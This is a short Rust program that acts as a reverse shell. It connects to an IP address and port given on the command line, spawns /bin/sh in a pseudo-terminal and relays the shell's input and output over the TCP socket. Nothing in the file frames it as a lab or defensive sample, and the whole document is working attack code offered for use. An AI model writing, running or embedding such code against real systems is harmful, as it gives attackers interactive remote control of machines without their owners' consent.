use std::{
    net::{IpAddr, SocketAddr, TcpStream},
    str::FromStr,
};

use clap::Parser;
use portable_pty::{native_pty_system, CommandBuilder, PtySize};

#[derive(Parser, Debug)]
struct Args {
    #[arg(short, long)]
    ip: String,

    #[arg(short, long)]
    port: u16,
}

#[tokio::main]
async fn main() {
    println!("hello");
    let args = Args::parse();
    let ip = IpAddr::from_str(&args.ip).unwrap();
    spawn_shell_tunnel(ip, args.port).await;
}

async fn spawn_shell_tunnel(ip: IpAddr, port: u16) {
    let addr = SocketAddr::new(ip, port);
    let tcp_stream = TcpStream::connect(addr).unwrap();

    let pair = native_pty_system()
        .openpty(PtySize {
            rows: 24,
            cols: 80,
            // Not all systems support pixel_width, pixel_height,
            // but it is good practice to set it to something
            // that matches the size of the selected font.  That
            // is more complex than can be shown here in this
            // brief example though!
            pixel_width: 0,
            pixel_height: 0,
        })
        .unwrap();

    // Spawn a shell into the pty
    let cmd = CommandBuilder::new("/bin/sh");
    let _child = pair.slave.spawn_command(cmd).unwrap();
    let pty_reader = pair.master.try_clone_reader().unwrap();
    let pty_writer = pair.master.take_writer().unwrap();

    let t1 = pipe_thread(pty_reader, tcp_stream.try_clone().unwrap());
    let t2 = pipe_thread(tcp_stream, pty_writer);

    t1.await.unwrap();
    t2.await.unwrap();
}

fn pipe_thread<R, W>(mut r: R, mut w: W) -> tokio::task::JoinHandle<()>
where
    R: std::io::Read + Send + 'static,
    W: std::io::Write + Send + 'static,
{
    tokio::spawn(async move {
        let mut buffer = [0; 1024];
        loop {
            let len = r.read(&mut buffer).unwrap();
            if len == 0 {
                break;
            }
            w.write_all(&buffer[..len]).unwrap();
            w.flush().unwrap();
        }
    })
}
